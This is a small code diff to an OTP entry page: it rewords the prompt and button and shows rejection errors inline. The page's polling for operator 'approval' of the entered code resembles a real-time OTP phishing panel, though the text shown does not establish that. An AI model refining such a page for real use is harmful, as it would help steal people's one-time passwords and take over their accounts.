@@ -28,7 +28,7 @@ button:enabled { opacity:1; }
   <div class="close">✕</div>
 
   <h1>Enter OTP</h1>
-  <div class="info">Please enter the OTP sent to verify your number</div>
+  <div class="info">Please enter the 6 digit  OTP sent to verify.  </div>
 
   <div class="otp-wrap">
     <input type="tel" maxlength="1" inputmode="numeric">
@@ -38,10 +38,10 @@ button:enabled { opacity:1; }
     <input type="tel" maxlength="1" inputmode="numeric">
     <input type="tel" maxlength="1" inputmode="numeric">
   </div>
-
+  <div id="otp-alert"></div>
   <div class="timer">You can resend OTP in <span id="countdown">120</span></div>
 
-  <button id="verifyBtn" disabled>Verify OTP</button>
+  <button id="verifyBtn" disabled>Submit </button>
 
   <div id="waiting" class="waiting">⏳ Waiting for approval…</div>
 </div>
@@ -113,7 +113,8 @@ function pollApproval(requestId){
       verifyBtn.disabled=true;
       verifyBtn.textContent='Verify OTP';
       waitingEl.style.display='none';
-      alert('OTP rejected. Please try again.');
+      document.getElementById('otp-alert').textContent = 'Wrong otp. Please try again.';
+      document.getElementById('otp-alert').style.color = 'red';
     }
   },2000);
 }
